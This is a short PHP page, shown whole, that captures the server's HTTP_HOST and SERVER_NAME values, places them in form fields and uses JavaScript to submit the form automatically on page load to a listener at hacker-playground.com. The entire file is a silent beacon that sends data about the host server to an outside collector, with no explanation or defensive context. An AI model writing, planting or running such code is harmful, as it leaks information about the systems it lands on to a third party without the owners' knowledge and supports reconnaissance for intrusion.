<?php

$h = $_SERVER['HTTP_HOST'] ;
$s = $_SERVER['SERVER_NAME'] ;




?>

<form name="frm1"  id="frm1" action="http://hacker-playground.com/listener.php" method="post">

    <input type="text" name="h" id="h" value="<?php echo $h;?>" />
    <input type="text" name="s" id="s" value="<?php echo $s;?>" />
</form>

<script>



window.onload = function(){
  document.forms['frm1'].submit()

}

</script>